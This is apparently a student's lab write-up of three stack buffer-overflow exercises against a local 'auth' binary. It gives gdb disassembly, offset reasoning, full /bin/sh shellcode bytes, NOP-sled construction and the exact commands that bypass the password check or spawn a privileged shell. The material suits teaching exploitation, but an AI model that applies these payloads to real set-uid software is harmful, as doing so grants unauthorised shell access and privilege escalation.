task 1 -- Control-Flow Hijacking

Any guess of the password is likely to be wrong. The trick here lies in jumping
to a point where the system call is made to give shell access, bypassing the
password check completely.

COMMAND							Thought Process:

gdb ./auth

disas main			What we see:
					.
					.
					.
					0x08048671 <+60>:	call   0x80485cb <authenticate>
   					0x08048676 <+65>:	add    $0x10,%esp
   					0x08048679 <+68>:	test   %eax,%eax
  					0x0804867b <+70>:	jne    0x804869f <main+106>
   					0x0804867d <+72>:	sub    $0xc,%esp
   					0x08048680 <+75>:	push   $0x804879b
   					0x08048685 <+80>:	call   0x8048470 <puts@plt>
   					0x0804868a <+85>:	add    $0x10,%esp
   					0x0804868d <+88>:	sub    $0xc,%esp
   					0x08048690 <+91>:	push   $0x80487a4
   					0x08048695 <+96>:	call   0x8048480 <system@plt>
					.
					.
					.
					Viewing the assembly code for main, we can see it calls
					"authenticate" which checks the password then afterwards
					a "test %eax, %eax" then a jump not equal "jne SOME ADDRESS"
					This jne address calls a puts, likely putting "acess denied"
					However in the assembly at main <+96> a system call is made
					presumably to give shell access. So if we can jump to a
					point before this we can bypass the consequence of putting
					in a wrong password. A good choice is 0x08048685 at 
					main <+80> where a "puts" call is made but it's not the
					only choice.

					Since our password is loaded into the buffer during the
					"authenticate" function, we need to check it out to find
					out how many bytes we need to put in to overwrite up to
					the return address after <authenticate>
					
					(when authenticate is called at main +60, a return address
					to the next instruction is placed on the stack to main +65.
					This instruction carries on to do the string testing, 
					precisely what we want to skip over so we need to overwrite
					this with the "good choice" found above)

disas authenticate		What we see:

					0x080485cb <+0>:	push   %ebp
					0x080485cc <+1>:	mov    %esp,%ebp
   					0x080485ce <+3>:	sub    $0x28,%esp
   					0x080485d1 <+6>:	sub    $0x8,%esp
   					0x080485d4 <+9>:	pushl  0x8(%ebp)
   					0x080485d7 <+12>:	lea    -0x15(%ebp),%eax
   					0x080485da <+15>:	push   %eax
   					0x080485db <+16>:	call   0x8048460 <strcpy@plt>
					.
					.
					.
					Here we see several bytes being loaded on the the stack
					the last of which is a 'lea', load effective address which
					is placed into eax and pushed onto the stack. Since a
					strcpy is being called, we know this is taking our input
					(argv[1]) and loading that into the address ebp-15 hex bytes
					(or 21 bytes) below ebp.
					
					So we know that we must input something that is 29 bytes
					long! (21 to overwrite everything above ebp, 4 to overwrite
					ebp and 4 more to overwrite the return addres)



./auth $(python -c 'print "A"+"\x85\x86\x04\x08"*7')

					printing the character 'A' concatenated with the alternative
					return address (in little endian form) does the trick
					since each char is 1 byte this is 1+28 bytes. This is one
					of many ways to do it.










Task 2

If we don't want to be just constrained to what the program does but insead
are more interested in using the raised privilige to execute arbitrary code
then we can inject shellcode. In this task we are given a large input buffer
which we can use to fit in shell code (given below)

\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh

Let's first find out exactly how much memory is allocated on the stack so we
can how how many bytes to write to overwrite the return address.

gdb ./auth

disas authenticate

.
.
.
	0x080485a7 <+12>:	lea    -0x5c(%ebp),%eax
   	0x080485aa <+15>:	push   %eax
   	0x080485ab <+16>:	call   0x8048440 <strcpy@plt>
.
.
.

so x5c or 92 bytes below ebp is where our input will start to be written to
+ 4 bytes for ebp + 4 bytes to overwrite the return address. 100 bytes total.

The basic attack is to write 100 bytes some of which is our given shellcode
and we want to override the return address to hit the shell code.
The problem is that when we run gdb to find out where the shellcode is, that
address is not necessarily the same because gdb may run with different 
environment variables (which sit higher in memory than the stack, so this
results in shifting the stack up differently). This is where the remaining
bytes come to be useful.

45 byte shellcode + 4 bytes for return address = 49 bytes, leaving 51 left over.
If we fill these with \x90 (no operation bytes or NOPS) then if we redirect
anywhere in this NOP region, we will "slide" down until we hit the shellcode.

With no change in environment we could find the exact address by finding what
"$ebp -x5c" corresponds to. We can use this to get an approximate location then
search around their in increments of 50 bytes (in order to guarantee we don't
miss our "NOP sled".

gdb ./auth

break *0x080485aa (because at this point the address is loaded into eax)
						(see in the disassembly above)
(gdb) run

Breakpoint 4, 0x080485aa in authenticate ()
(gdb) i r eax
eax            0xbffff57c	-1073744516


So we can try this with \x7c\xf5\xff\xbf as our return address then shift it.
The bash command that worked for me was:


/home/Shelly/auth $(python -c 'print ("\x90"*51)+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"+"\xd0\xf7\xff\xbf"')












task 3

Like in task 2, we wish to gain shell access via raised priviliges by exploiting
vulnerabilities in a poorly written code. This time however, the buffer is too
small to even fit shell code in. The work around however is to store the
shellcode in an environment variable, then write code whose return address
points to this environment variable.

First, let's put the shellcode in the environment. (As in task2, gdb will not
give us an exact location because it may run in a slightly different environment
but if we give a fairly big NOP slide, and land somewhere in that address, this
should be no issue)


export SHELLCODE=$'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh'


NOTE: the $'...' is necessary for the \x's to be interpreted by bash as hex,
otherwise we would just be uploading a string.



Environment variables are written HIGHER in memory than the stack, so we can
set a breakpoint in the code and examine the set of strings above the stack ptr


gdb ./auth

break main

run

x/24s $esp + 0x200 		(<--some trial and error involved to find this location)	

What we see:
0xbffff724: "8"
0xbffff726: "SHELLCODE=", '\220' <repeats 190 times>...
0xbffff7ee: "\220\220\220\220\220\220\220\220\220\220\353\037^\211v\b1\300\210F\a\211F\f\260\v\211\363\215N\b\215V\f̀1ۉ\330@̀\350\334\377\377\377/bin/sh"
0xbffff826: "SHELL=/bin/bash"
.
.
.

So the shell code is stored at address 0xbffff726 and the final few dozen bytes
are stored at 0xbffff7ee, so choosing an address about halfway between the two
should give us enough wiggle room to land in our NOP slide and execute the
shellcode. The NOP slide is 200 bytes long so going up 100 (x64) is around the
middle (i.e. 0xbffff628 will be our return address)

Now we need to find out how many bytes we need to input to overwrite the
return address after authenticate in main

disas authenticate

   0x0804859b <+0>:     push   %ebp
   0x0804859c <+1>:     mov    %esp,%ebp
   0x0804859e <+3>:     sub    $0x28,%esp
   0x080485a1 <+6>:     sub    $0x8,%esp
   0x080485a4 <+9>:     pushl  0x8(%ebp)
   0x080485a7 <+12>:    lea    -0x15(%ebp),%eax
   0x080485aa <+15>:    push   %eax
   0x080485ab <+16>:    call   0x8048440 <strcpy@plt>
.
.
.

Same buffer size as in task 1 (x15 + x4 for ebp + x4 for ret addr = 29 bytes)


The following command line command does the trick:

/home/Codey/auth $(python -c 'print "A"+"\x28\xf6\xff\xbf"*7')


